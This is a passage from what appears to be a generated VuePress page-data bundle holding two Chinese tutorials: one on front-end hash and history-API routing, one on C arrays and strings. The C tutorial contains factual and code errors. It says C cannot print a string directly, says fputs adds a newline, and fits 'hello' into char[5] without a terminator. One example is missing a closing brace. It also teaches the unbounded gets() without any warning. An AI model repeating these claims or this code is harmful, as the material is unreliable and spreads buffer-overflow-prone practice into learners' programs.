0;\n}\n',charsets:{cjk:!0}},{title:"前端路由原理",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/09-%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1%E5%8E%9F%E7%90%86.html",relativePath:"React/React路由/09-前端路由原理.md",key:"v-ac3c3d16",path:"/React/React%E8%B7%AF%E7%94%B1/09-%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1%E5%8E%9F%E7%90%86.html",headers:[{level:2,title:"前端路由由来",slug:"前端路由由来",normalizedTitle:"前端路由由来",charIndex:309},{level:2,title:"优势与劣势",slug:"优势与劣势",normalizedTitle:"优势与劣势",charIndex:417},{level:2,title:"路由实现原理",slug:"路由实现原理",normalizedTitle:"路由实现原理",charIndex:710},{level:2,title:"Hash路由",slug:"hash路由",normalizedTitle:"hash路由",charIndex:846},{level:2,title:"HTML5 history API路由实现",slug:"html5-history-api路由实现",normalizedTitle:"html5 history api路由实现",charIndex:2149},{level:2,title:"附录",slug:"附录",normalizedTitle:"附录",charIndex:4584}],headersStr:"前端路由由来 优势与劣势 路由实现原理 Hash路由 HTML5 history API路由实现 附录",content:"# 前端路由原理\n\n访问一个网站，假如我们访问这三个页面：\n\nhttp://www.sina.com.cn/nba/\n\nhttp://www.sina.com.cn/tennis/\n\nhttp://www.sina.com.cn/csl/\n\n\n那么其路径就分别是 /nba，/tennis，/csl\n\n当用户使用http://www.sina.com.cn/nba/来访问该页面时，Web 服务会接收到这个请求，然后会解析 URI 中的路径 /nba，在 Web 服务的程序中，该路径对应着相应的处理逻辑，程序会把请求交给路径所对应的处理逻辑，这样就完成了一次「路由分发」，这个分发就是通过「路由」来完成的。\n\n\n# 前端路由由来\n\n随着前端技术的发展，现在很多web应用都采用了SPA的形式，之前是通过服务端根据 url 的不同返回不同的页面实现无法满足需求，所以这里需要把不同路由对应不同的内容或页面的任务交给前端来做。\n\n\n# 优势与劣势\n\n通过这种前端路由实现的单页面应用有几个好处：\n\n 1. 良好的前后端分离。SPA和RESTful架构一起使用，后端不再负责模板渲染、输出页面工作，web前端和各种移动终端地位对等，后端API通用化。\n 2. 用户体验好、快，内容的改变不需要重新加载整个页面，web应用更具响应性和更令人着迷\n 3. 同一套后端程序代码，不用修改就可以用于Web界面、手机、平板、等多种客户端\n\n但是同样也有其缺点:\n\n 1. 不利于SEO。\n 2. 初次加载耗时相对增多。\n 3. 导航不可用，如果一定要导航需要自行实现前进、后退。\n\n接下来我们来看一下前端的路由是如何实现的。\n\n\n# 路由实现原理\n\n在HTML5的 history API 出现之前，前端的路由都是通过 hash 来实现的，hash 能兼容低版本的浏览器。当 url 的 hash 发生变化时，触发 hashchange 注册的回调，回调中去进行不同的操作，进行不同的内容的展示。\n\n\n# Hash路由\n\nhtml:\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"UTF-8\">\n\t<title>Document</title>\n</head>\n<body>\n\t<div class=\"container\">\n\t\t<nav>\n\t\t\t<ul>\n\t\t\t\t<li><a href=\"#/\">首页</a></li>\n\t\t\t\t<li><a href=\"#/new\">新闻</a></li>\n\t\t\t\t<li><a href=\"#/product\">产品</a></li>\n\t\t\t\t<li><a href=\"#/about\">关于我们</a></li>\n\t\t\t</ul>\n\n\t\t</nav>\n\t</div>\n\n\t<div id=\"content\">\n\n\t</div>\n\t<script>\n\tvar content = document.querySelector('#content')\n\tvar r = Router({\n\t\t'/':function(){\n\t\t\tcontent.innerHTML = \"首页\"\n\t\t},\n\t\t'/new':function(){\n\t\t\tcontent.innerHTML = \"新闻\"\n\t\t},\n\t\t'/product':function(){\n\t\t\tcontent.innerHTML = \"产品\"\n\t\t},\n\t\t'/about':function(){\n\t\t\tcontent.innerHTML = \"关于我们\"\n\t\t},\n\t})\n\t<\/script>\n</body>\n</html>\n\n\njs:\n\nfunction _route(option){\n\tthis.option = option || {};\n}\n_route.prototype.on = function(ev,callback){\n\tvar evs = ev.split(\" \");\n\tfor(var i=0;i<evs.length;i++){\n\t\twindow.addEventListener(evs[i],callback)\n\t}\n}\n\n_route.prototype.init = function(){\n\tthis.on(\"load hashchange\",this.refresh.bind(this))\n}\n\n_route.prototype.refresh = function(){\n\tthis.currentUrl = location.hash.slice(1)||\"/\";\n\tthis.option[this.currentUrl]();\n}\n\n_route.prototype.rt = function(path,callback){\n\tthis.option[path] = callback;\n\treturn this;\n}\n\nfunction Router(option){\n\tvar r = new _route(option);\n\tr.init();\n\treturn r;\n}\n\n\n\n# HTML5 history API路由实现\n\nhtml5 增加了两个方法，分别是pushState，replaceState。\n\npushState和replaceState是用来手动插入历史记录，然后执行AJAX请求，而popstate就是当浏览器前进后退的时候获得相应的state再执行相应操作。\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>History Roter</title>\n</head>\n<body>\n\t<div class=\"container\">\n\t\t<nav>\n\t\t\t<ul>\n\t\t\t\t<li><a href=\"#/\">首页</a></li>\n\t\t\t\t<li><a href=\"#/new\">新闻</a></li>\n\t\t\t\t<li><a href=\"#/product\">产品</a></li>\n\t\t\t\t<li><a href=\"#/about\">关于我们</a></li>\n\t\t\t</ul>\n\t\t</nav>\n\t</div>\n\n\t<div id=\"content\"></div>\n    <script>\n\tclass Router {\n\t     constructor(routes = {}) {\n\t          this.routes = routes;\n\t          this.curUrl = \"\";\n\t      }\n\t      notify(state){\n\t        this.curUrl = state.path || '/';\n\t        if(this.routes[this.curUrl]){\n\t          this.routes[this.curUrl]();\n\t        }else{\n\t          console.log('路由没有注册');\n\t        }\n\t      }\n\t      route(path,callback){\n\t        this.routes[path] = callback || function(){\n\n\t        }\n\t      }\n\t      init(){\n\t        let that = this;\n\t        //浏览器点击前进后退时触发的事件\n\t         window.addEventListener('popstate',function(event){\n\t            that.notify(event.state || {})\n\t         }, false);\n\n\t         //监控页面A标签，跳转做处理\n\t         document.querySelector('body').addEventListener('click', function(event){\n\t          if(event.target.tagName === 'A'){\n\t            let link = event.target.getAttribute('href');\n\t            if(!/^http/.test(link)){\n\t              event.preventDefault();\n\t              let path = link.slice(1) || '/';\n\t              that.notify({ 'path' : path} || {})\n\t              if(event.target.getAttribute('type') == 'replace'){\n\t                history.replaceState({ 'path' : path},'',event.target.href);\n\t              }else{\n\t                history.pushState({ 'path' : path},'',event.target.href);\n\t              }             \n\t            }       \n\t          }   \n\t         }, false)\n\n\t         //首次进入页面进行路由\n\t        let path = location.hash.slice(1) || '/';\n\t        that.notify({ 'path' : path} || {})\n\t      }\n\t  }\n\n\t  function changeContent(text){\n\t    document.getElementById('content').innerHTML = text;\n\t  }\n\t  let router = new Router({\n\t    '/':function(){\n\t    \tchangeContent('首页');\n\t\t\t},\n\t\t\t'/new':function(){\n\t    \tchangeContent('新闻');\n\t\t\t},\n\t\t\t'/product':function(){\n\t      changeContent('产品');\n\t\t\t}\n\t  })\n\n\t  router.route('/about',function(){\n\t    changeContent('关于我们');\n\t  })\n\n\t  router.init();\n    <\/script>\n</body>\n\n</html>\n\n\n\n# 附录\n\n * http://www.cnblogs.com/caizhenbo/p/7250239.html",normalizedContent:"# 前端路由原理\n\n访问一个网站，假如我们访问这三个页面：\n\nhttp://www.sina.com.cn/nba/\n\nhttp://www.sina.com.cn/tennis/\n\nhttp://www.sina.com.cn/csl/\n\n\n那么其路径就分别是 /nba，/tennis，/csl\n\n当用户使用http://www.sina.com.cn/nba/来访问该页面时，web 服务会接收到这个请求，然后会解析 uri 中的路径 /nba，在 web 服务的程序中，该路径对应着相应的处理逻辑，程序会把请求交给路径所对应的处理逻辑，这样就完成了一次「路由分发」，这个分发就是通过「路由」来完成的。\n\n\n# 前端路由由来\n\n随着前端技术的发展，现在很多web应用都采用了spa的形式，之前是通过服务端根据 url 的不同返回不同的页面实现无法满足需求，所以这里需要把不同路由对应不同的内容或页面的任务交给前端来做。\n\n\n# 优势与劣势\n\n通过这种前端路由实现的单页面应用有几个好处：\n\n 1. 良好的前后端分离。spa和restful架构一起使用，后端不再负责模板渲染、输出页面工作，web前端和各种移动终端地位对等，后端api通用化。\n 2. 用户体验好、快，内容的改变不需要重新加载整个页面，web应用更具响应性和更令人着迷\n 3. 同一套后端程序代码，不用修改就可以用于web界面、手机、平板、等多种客户端\n\n但是同样也有其缺点:\n\n 1. 不利于seo。\n 2. 初次加载耗时相对增多。\n 3. 导航不可用，如果一定要导航需要自行实现前进、后退。\n\n接下来我们来看一下前端的路由是如何实现的。\n\n\n# 路由实现原理\n\n在html5的 history api 出现之前，前端的路由都是通过 hash 来实现的，hash 能兼容低版本的浏览器。当 url 的 hash 发生变化时，触发 hashchange 注册的回调，回调中去进行不同的操作，进行不同的内容的展示。\n\n\n# hash路由\n\nhtml:\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n\t<meta charset=\"utf-8\">\n\t<title>document</title>\n</head>\n<body>\n\t<div class=\"container\">\n\t\t<nav>\n\t\t\t<ul>\n\t\t\t\t<li><a href=\"#/\">首页</a></li>\n\t\t\t\t<li><a href=\"#/new\">新闻</a></li>\n\t\t\t\t<li><a href=\"#/product\">产品</a></li>\n\t\t\t\t<li><a href=\"#/about\">关于我们</a></li>\n\t\t\t</ul>\n\n\t\t</nav>\n\t</div>\n\n\t<div id=\"content\">\n\n\t</div>\n\t<script>\n\tvar content = document.queryselector('#content')\n\tvar r = router({\n\t\t'/':function(){\n\t\t\tcontent.innerhtml = \"首页\"\n\t\t},\n\t\t'/new':function(){\n\t\t\tcontent.innerhtml = \"新闻\"\n\t\t},\n\t\t'/product':function(){\n\t\t\tcontent.innerhtml = \"产品\"\n\t\t},\n\t\t'/about':function(){\n\t\t\tcontent.innerhtml = \"关于我们\"\n\t\t},\n\t})\n\t<\/script>\n</body>\n</html>\n\n\njs:\n\nfunction _route(option){\n\tthis.option = option || {};\n}\n_route.prototype.on = function(ev,callback){\n\tvar evs = ev.split(\" \");\n\tfor(var i=0;i<evs.length;i++){\n\t\twindow.addeventlistener(evs[i],callback)\n\t}\n}\n\n_route.prototype.init = function(){\n\tthis.on(\"load hashchange\",this.refresh.bind(this))\n}\n\n_route.prototype.refresh = function(){\n\tthis.currenturl = location.hash.slice(1)||\"/\";\n\tthis.option[this.currenturl]();\n}\n\n_route.prototype.rt = function(path,callback){\n\tthis.option[path] = callback;\n\treturn this;\n}\n\nfunction router(option){\n\tvar r = new _route(option);\n\tr.init();\n\treturn r;\n}\n\n\n\n# html5 history api路由实现\n\nhtml5 增加了两个方法，分别是pushstate，replacestate。\n\npushstate和replacestate是用来手动插入历史记录，然后执行ajax请求，而popstate就是当浏览器前进后退的时候获得相应的state再执行相应操作。\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <title>history roter</title>\n</head>\n<body>\n\t<div class=\"container\">\n\t\t<nav>\n\t\t\t<ul>\n\t\t\t\t<li><a href=\"#/\">首页</a></li>\n\t\t\t\t<li><a href=\"#/new\">新闻</a></li>\n\t\t\t\t<li><a href=\"#/product\">产品</a></li>\n\t\t\t\t<li><a href=\"#/about\">关于我们</a></li>\n\t\t\t</ul>\n\t\t</nav>\n\t</div>\n\n\t<div id=\"content\"></div>\n    <script>\n\tclass router {\n\t     constructor(routes = {}) {\n\t          this.routes = routes;\n\t          this.cururl = \"\";\n\t      }\n\t      notify(state){\n\t        this.cururl = state.path || '/';\n\t        if(this.routes[this.cururl]){\n\t          this.routes[this.cururl]();\n\t        }else{\n\t          console.log('路由没有注册');\n\t        }\n\t      }\n\t      route(path,callback){\n\t        this.routes[path] = callback || function(){\n\n\t        }\n\t      }\n\t      init(){\n\t        let that = this;\n\t        //浏览器点击前进后退时触发的事件\n\t         window.addeventlistener('popstate',function(event){\n\t            that.notify(event.state || {})\n\t         }, false);\n\n\t         //监控页面a标签，跳转做处理\n\t         document.queryselector('body').addeventlistener('click', function(event){\n\t          if(event.target.tagname === 'a'){\n\t            let link = event.target.getattribute('href');\n\t            if(!/^http/.test(link)){\n\t              event.preventdefault();\n\t              let path = link.slice(1) || '/';\n\t              that.notify({ 'path' : path} || {})\n\t              if(event.target.getattribute('type') == 'replace'){\n\t                history.replacestate({ 'path' : path},'',event.target.href);\n\t              }else{\n\t                history.pushstate({ 'path' : path},'',event.target.href);\n\t              }             \n\t            }       \n\t          }   \n\t         }, false)\n\n\t         //首次进入页面进行路由\n\t        let path = location.hash.slice(1) || '/';\n\t        that.notify({ 'path' : path} || {})\n\t      }\n\t  }\n\n\t  function changecontent(text){\n\t    document.getelementbyid('content').innerhtml = text;\n\t  }\n\t  let router = new router({\n\t    '/':function(){\n\t    \tchangecontent('首页');\n\t\t\t},\n\t\t\t'/new':function(){\n\t    \tchangecontent('新闻');\n\t\t\t},\n\t\t\t'/product':function(){\n\t      changecontent('产品');\n\t\t\t}\n\t  })\n\n\t  router.route('/about',function(){\n\t    changecontent('关于我们');\n\t  })\n\n\t  router.init();\n    <\/script>\n</body>\n\n</html>\n\n\n\n# 附录\n\n * http://www.cnblogs.com/caizhenbo/p/7250239.html",charsets:{cjk:!0}},{title:"数组和字符串",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/03-%E6%95%B0%E7%BB%84%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2.html",relativePath:"数据结构/C语言程序设计/03-数组和字符串.md",key:"v-b2e4e7ba",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/03-%E6%95%B0%E7%BB%84%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2.html",headers:[{level:2,title:"数组和字符串",slug:"数组和字符串",normalizedTitle:"数组和字符串",charIndex:2},{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:13},{level:2,title:"一维数组",slug:"一维数组",normalizedTitle:"一维数组",charIndex:231},{level:3,title:"定义和使用",slug:"定义和使用",normalizedTitle:"定义和使用",charIndex:240},{level:3,title:"案例",slug:"案例",normalizedTitle:"案例",charIndex:968},{level:2,title:"二维数组",slug:"二维数组",normalizedTitle:"二维数组",charIndex:1451},{level:3,title:"定义和使用",slug:"定义和使用-2",normalizedTitle:"定义和使用",charIndex:240},{level:3,title:"案例",slug:"案例-2",normalizedTitle:"案例",charIndex:968},{level:2,title:"字符数组与字符串",slug:"字符数组与字符串",normalizedTitle:"字符数组与字符串",charIndex:3190},{level:3,title:"区别：",slug:"区别",normalizedTitle:"区别：",charIndex:3203},{level:3,title:"定义和使用",slug:"定义和使用-3",normalizedTitle:"定义和使用",charIndex:240},{level:3,title:"字符串的输入输出",slug:"字符串的输入输出",normalizedTitle:"字符串的输入输出",charIndex:3873},{level:3,title:"案例",slug:"案例-3",normalizedTitle:"案例",charIndex:968}],headersStr:"数组和字符串 概述 一维数组 定义和使用 案例 二维数组 定义和使用 案例 字符数组与字符串 区别： 定义和使用 字符串的输入输出 案例",content:'# 数组和字符串\n\n\n# 概述\n\n> 数组是一种数据结构，它是一组连续的内存空间，用来存储一组具有相同类型的数据。\n\n * 数组的每个元素都是相同的数据类型，可以是基本数据类型，也可以是引用数据类型。并且所有成员在内存中是连续存储的。\n * 数组的长度是固定的，一旦创建，长度就不可改变。\n * 数组元素类型不同，数组可分为：数值型数组、字符型数组、布尔型数组、引用类型数组等。\n * 数组的下标个数称为数组的维数，数组的维数可以是1维、2维、3维等。\n\n\n# 一维数组\n\n\n# 定义和使用\n\n * 一维数组的定义格式：数据类型 数组名[数组长度]。\n * 一维数组的初始化格式：数据类型 数组名[数组长度] = {元素1, 元素2, ...}。\n * 一维数组的访问格式：数组名[下标]。\n\nTIP\n\n * 数组的下标从0开始，到数组长度-1结束。\n * 数组的长度必须是一个常量，不能是变量。\n * 数组的长度可以省略，但是必须初始化。\n * 数组名不能与其他变量名重复。同一个作用域内，不能有两个名字相同的变量。\n\n#include <stdio.h>\n\nint main() {\n\n    //定义一个长度为5的整型数组\n    int arr[5];\n    //定义一个长度为5的整型数组，并初始化\n    int arr2[5] = {1, 2, 3, 4, 5};\n    //定义一个长度为5的整型数组，并初始化\n    int arr3[5] = {1, 2, 3};\n    //定义一个长度为5的整型数组，并初始化\n    int arr4[5] = {0};\n    //定义一个长度为5的整型数组，并初始化\n    int arr5[] = {1, 2, 3, 4, 5};\n\n    //访问数组元素\n    printf("%d\\n", arr2[0]);    //1\n    printf("%d\\n", arr2[1]);    //2\n    printf("%d\\n", arr2[2]);    //3\n    printf("%d\\n", arr2[3]);    //4\n    printf("%d\\n", arr2[4]);    //5\n\n    return 0;\n}\n\n\n\n# 案例\n\n# 数组最大值\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5};\n\n    int max = arr[0];\n    for (int i = 1; i < 5; i++) {\n        if (arr[i] > max) {\n            max = arr[i];\n        }\n    }\n\n    printf("max = %d\\n", max);\n\n    return 0;\n}\n\n\n# 数组逆置\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5};\n\n    int temp;\n    for (int i = 0; i < 5 / 2 ; i++) {\n        temp = arr[i];\n        arr[i] = arr[4 - i];\n        arr[4 - i] = temp;\n    }\n\n}\n\n\n\n\n# 二维数组\n\n\n# 定义和使用\n\n * 二维数组的定义格式：数据类型 数组名[行数][列数]。\n * 二维数组的初始化格式：数据类型 数组名[行数][列数] = {{元素1, 元素2, ...}, {元素1, 元素2, ...}, ...}。\n * 二维数组的访问格式：数组名[行下标][列下标]。\n * 二维数组的行数和列数都必须是常量，不能是变量。\n\nTIP\n\n * 二维数组的行数和列数都必须是常量，不能是变量。\n * 二维数组的行数和列数可以省略，但是必须初始化。\n * 内存中并不存在二维数组，二维数组在内存中是以一维数组的形式存储的。\n\n#include <stdio.h>\n\nint main() {\n\n    //定义一个3行4列的整型数组\n    int arr[3][4];\n    //定义一个3行4列的整型数组，并初始化\n    int arr2[3][4] = {{1, 2, 3, 4}, {5, 6, 7, 8}, {9, 10, 11}};\n    //定义一个3行4列的整型数组，并初始化\n    int arr3[3][4] = {1, 2, 3, 4, 5, 6, 7, 8};\n    //定义一个3行4列的整型数组，并初始化\n    int arr4[3][4] = {0};\n    //定义一个3行4列的整型数组，并初始化\n    int arr5[][4] = {1, 2, 3, 4, 5, 6, 7, 8};\n\n    //访问数组元素\n    printf("%d\\n", arr2[0][0]);    //1\n    printf("%d\\n", arr2[0][1]);    //2\n    printf("%d\\n", arr2[0][2]);    //3\n    printf("%d\\n", arr2[0][3]);    //4\n    printf("%d\\n", arr2[1][0]);    //5\n    printf("%d\\n", arr2[1][1]);    //6\n    printf("%d\\n", arr2[1][2]);    //7\n    printf("%d\\n", arr2[1][3]);    //8\n    printf("%d\\n", arr2[2][0]);    //9\n    printf("%d\\n", arr2[2][1]);    //10\n    printf("%d\\n", arr2[2][2]);    //11\n    printf("%d\\n", arr2[2][3]);    //0\n\n    return 0;\n}\n\n\n\n# 案例\n\n# 二维数组逆置\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[3][4] = {{1, 2, 3, 4}, {5, 6, 7, 8}, {9, 10, 11}};\n\n    int temp;\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 4 / 2; j++) {\n            temp = arr[i][j];\n            arr[i][j] = arr[i][3 - j];\n            arr[i][3 - j] = temp;\n        }\n    }\n\n    return 0;\n}\n\n\n# 二维数组打印\n\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[3][4] = {{1, 2, 3, 4}, {5, 6, 7, 8}, {9, 10, 11}};\n\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 4; j++) {\n            printf("%d ", arr[i][j]);\n        }\n        printf("\\n");\n    }\n\n\n\n\n# 字符数组与字符串\n\n\n# 区别：\n\n * C语言中没有字符串类型，字符串是用字符数组来表示的。\n * 字符数组是一种特殊的一维数组，用来存储字符串。\n * 字符串是以\'\\0\'结尾的字符数组。\n * 字符串的长度是不包含\'\\0\'的长度。\n\n\n# 定义和使用\n\n * 字符数组的定义格式：数据类型 数组名[数组长度]。\n * 字符数组的初始化格式：数据类型 数组名[数组长度] = "字符串"。\n * 字符数组的访问格式：数组名[下标]。\n\n\n#include <stdio.h>\n\nint main() {\n\n    //定义一个长度为5的字符数组\n    char arr[5];\n    //定义一个长度为5的字符数组，并初始化\n    char arr2[5] = {\'h\', \'e\', \'l\', \'l\', \'o\'};\n    //定义一个长度为5的字符数组，并初始化\n    char arr3[5] = "hello";\n    //定义一个长度为5的字符数组，并初始化\n    char arr4[] = "hello";\n\n    //访问数组元素\n    printf("%c\\n", arr2[0]);    //h\n    printf("%c\\n", arr2[1]);    //e\n    printf("%c\\n", arr2[2]);    //l\n    printf("%c\\n", arr2[3]);    //l\n    printf("%c\\n", arr2[4]);    //o\n\n    return 0;\n}\n\n\n\n# 字符串的输入输出\n\n> C语言中没有提供直接输出字符串的函数，需要使用循环来输出字符串。\n\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[] = "hello";\n\n    //输出字符串\n    for (int i = 0; i < 5; i++) {\n        printf("%c", arr[i]);\n    }\n    printf("\\n");\n\n    //输入字符串\n    for (int i = 0; i < 5; i++) {\n        scanf("%c", &arr[i]);\n    }\n    printf("%s\\n", arr);\n\n    return 0;\n}\n\n\n函数         说明                       参数                                                        返回值\ngets()     用来输入字符串，可以输入空格，以回车结束。    char *s ：指向用来存储输入字符串的数组。                                  char * ：返回输入的字符串。\nputs()     用来输出字符串，输出完毕后会自动换行。      char *s ：指向要输出的字符串。                                       int ：返回输出的字符个数。\nfgets()    用来输入字符串，可以输入空格，以回车结束。    char *s ：指向用来存储输入字符串的数组。 int n ：最多读取的字符个数。 FILE *stream   char * ：返回输入的字符串。\n                                    ：指向要读取的文件。\nfputs()    用来输出字符串，输出完毕后不会自动换行。     char *s ：指向要输出的字符串。 FILE *stream ：指向要写入的文件。               int ：返回输出的字符个数。\nscanf()    用来输入字符串，以空格、制表符、换行符结束。   char *format ：格式控制字符串。 ... ：要输入的字符串。                      int ：返回成功匹配并赋值的个数。\nstrlen()   用来计算字符串的长度，不包含 \\0 。      char *s ：指向要计算的字符串。                                       int ：返回字符串的长度。\n\n * gets()函数：用来输入字符串，可以输入空格，以回车结束。\n\nTIP\n\n * gets()函数会自动在输入的字符串末尾添加\\0。\n * gets()函数会自动忽略回车键。\n\n * puts()函数：用来输出字符串，输出完毕后会自动换行。\n\nTIP\n\n * puts()函数会自动在输出的字符串末尾添加\\n。\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[100];\n\n    //输入字符串\n    gets(arr);\n    //输出字符串\n    puts(arr);\n\n    return 0;\n}\n\n\n * fgets()函数：用来输入字符串，可以输入空格，以回车结束。\n\nTIP\n\n * fgets()函数会自动在输入的字符串末尾添加\\0。\n * fgets()函数会自动忽略回车键。\n\n * fputs()函数：用来输出字符串，输出完毕后不会自动换行。\n\nTIP\n\n * fputs()函数会自动在输出的字符串末尾添加\\n。\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[100];\n\n    //输入字符串\n    fgets(arr, 100, stdin);\n    //输出字符串\n    fputs(arr, stdout);\n\n    return 0;\n}\n\n\n * scanf()函数：用来输入字符串，以空格、制表符、换行符结束。\n\nTIP\n\n * scanf()函数会自动在输入的字符串末尾添加\\0。\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[100];\n\n    //输入字符串\n    scanf("%s", arr);\n    //输出字符串\n    printf("%s\\n", arr);\n\n    return 0;\n}\n\n\n * strlen()函数：用来计算字符串的长度，不包含 \\0 。\n\nTIP\n\n * strlen()函数不会自动在输入的字符串末尾添加\\0。\n\n\n#include <stdio.h>\n\nint main() {\n\n    char arr[] = "hello";\n\n    printf("%d\\n", strlen(arr));\n\n    return 0;\n}\n\n\n\n# 案例\n\n# 字符串添加\n\n  #include <stdio.h>\n\n  int main() {\n\n      char arr[100] = "hello";\n\n      //输入字符串\n      scanf("%s", arr);\n      //输出字符串\n      printf("%s\\n", arr);\n\n      return 0;\n  }\n',normalizedContent:'# 数组和字符串\n\n\n# 概述\n\n> 数组是一种数据结构，它是一组连续的内存空间，用来存储一组具有相同类型的数据。\n\n * 数组的每个元素都是相同的数据类型，可以是基本数据类型，也可以是引用数据类型。并且所有成员在内存中是连续存储的。\n * 数组的长度是固定的，一旦创建，长度就不可改变。\n * 数组元素类型不同，数组可分为：数值型数组、字符型数组、布尔型数组、引用类型数组等。\n * 数组的下标个数称为数组的维数，数组的维数可以是1维、2维、3维等。\n\n\n# 一维数组\n\n\n# 定义和使用\n\n * 一维数组的定义格式：数据类型 数组名[数组长度]。\n * 一维数组的初始化格式：数据类型 数组名[数组长度] = {元素1, 元素2, ...}。\n * 一维数组的访问格式：数组名[下标]。\n\ntip\n\n * 数组的下标从0开始，到数组长度-1结束。\n * 数组的长度必须是一个常量，不能是变量。\n * 数组的长度可以省略，但是必须初始化。\n * 数组名不能与其他变量名重复。同一个作用域内，不能有两个名字相同的变量。\n\n#include <stdio.h>\n\nint main() {\n\n    //定义一个长度为5的整型数组\n    int arr[5];\n    //定义一个长度为5的整型数组，并初始化\n    int arr2[5] = {1, 2, 3, 4, 5};\n    //定义一个长度为5的整型数组，并初始化\n    int arr3[5] = {1, 2, 3};\n    //定义一个长度为5的整型数组，并初始化\n    int arr4[5] = {0};\n    //定义一个长度为5的整型数组，并初始化\n    int arr5[] = {1, 2, 3, 4, 5};\n\n    //访问数组元素\n    printf("%d\\n", arr2[0]);    //1\n    printf("%d\\n", arr2[1]);    //2\n    printf("%d\\n", arr2[2]);    //3\n    printf("%d\\n", arr2[3]);    //4\n    printf("%d\\n", arr2[4]);    //5\n\n    return 0;\n}\n\n\n\n# 案例\n\n# 数组最大值\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5};\n\n    int max = arr[0];\n    for (int i = 1; i < 5; i++) {\n        if (arr[i] > max) {\n            max = arr[i];\n        }\n    }\n\n    printf("max = %d\\n", max);\n\n    return 0;\n}\n\n\n# 数组逆置\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[5] = {1, 2, 3, 4, 5};\n\n    int temp;\n    for (int i = 0; i < 5 / 2 ; i++) {\n        temp = arr[i];\n        arr[i] = arr[4 - i];\n        arr[4 - i] = temp;\n    }\n\n}\n\n\n\n\n# 二维数组\n\n\n# 定义和使用\n\n * 二维数组的定义格式：数据类型 数组名[行数][列数]。\n * 二维数组的初始化格式：数据类型 数组名[行数][列数] = {{元素1, 元素2, ...}, {元素1, 元素2, ...}, ...}。\n * 二维数组的访问格式：数组名[行下标][列下标]。\n * 二维数组的行数和列数都必须是常量，不能是变量。\n\ntip\n\n * 二维数组的行数和列数都必须是常量，不能是变量。\n * 二维数组的行数和列数可以省略，但是必须初始化。\n * 内存中并不存在二维数组，二维数组在内存中是以一维数组的形式存储的。\n\n#include <stdio.h>\n\nint main() {\n\n    //定义一个3行4列的整型数组\n    int arr[3][4];\n    //定义一个3行4列的整型数组，并初始化\n    int arr2[3][4] = {{1, 2, 3, 4}, {5, 6, 7, 8}, {9, 10, 11}};\n    //定义一个3行4列的整型数组，并初始化\n    int arr3[3][4] = {1, 2, 3, 4, 5, 6, 7, 8};\n    //定义一个3行4列的整型数组，并初始化\n    int arr4[3][4] = {0};\n    //定义一个3行4列的整型数组，并初始化\n    int arr5[][4] = {1, 2, 3, 4, 5, 6, 7, 8};\n\n    //访问数组元素\n    printf("%d\\n", arr2[0][0]);    //1\n    printf("%d\\n", arr2[0][1]);    //2\n    printf("%d\\n", arr2[0][2]);    //3\n    printf("%d\\n", arr2[0][3]);    //4\n    printf("%d\\n", arr2[1][0]);    //5\n    printf("%d\\n", arr2[1][1]);    //6\n    printf("%d\\n", arr2[1][2]);    //7\n    printf("%d\\n", arr2[1][3]);    //8\n    printf("%d\\n", arr2[2][0]);    //9\n    printf("%d\\n", arr2[2][1]);    //10\n    printf("%d\\n", arr2[2][2]);    //11\n    printf("%d\\n", arr2[2][3]);    //0\n\n    return 0;\n}\n\n\n\n# 案例\n\n# 二维数组逆置\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[3][4] = {{1, 2, 3, 4}, {5, 6, 7, 8}, {9, 10, 11}};\n\n    int temp;\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 4 / 2; j++) {\n            temp = arr[i][j];\n            arr[i][j] = arr[i][3 - j];\n            arr[i][3 - j] = temp;\n        }\n    }\n\n    return 0;\n}\n\n\n# 二维数组打印\n\n\n#include <stdio.h>\n\nint main() {\n\n    int arr[3][4] = {{1, 2, 3, 4}, {5, 6, 7, 8}, {9, 10, 11}};\n\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 4; j++) {\n            printf("%d ", arr[i][j]);\n        }\n        printf("\\n");\n    }\n\n\n\n\n# 字符数组与字符串\n\n\n# 区别：\n\n * c语言中没有字符串类型，字符串是用字符数组来表示的。\n * 字符数组是一种特殊的一维数组，用来存储字符串。\n * 字符串是以\'\\0\'结尾的字符数组。\n * 字符串的长度是不包含\'\\0\'的长度。\n\n\n# 定义和使用\n\n * 字符数组的定义格式：数据类型 数组名[数组长度]。\n * 字符数组的初始化格式：数据类型 数组名[数组长度] = "字符串"。\n * 字符数组的访问格式：数组名[下标]。\n\n\n#include <stdio.h>\n\nint main() {\n\n    //定义一个长度为5的字符数组\n    char arr[5];\n    //定义一个长度为5的字符数组，并初始化\n    char arr2[5] = {\'h\', \'e\', \'l\', \'l\', \'o\'};\n    //定义一个长度为5的字符数组，并初始化\n    char arr3[5] = "hello";\n    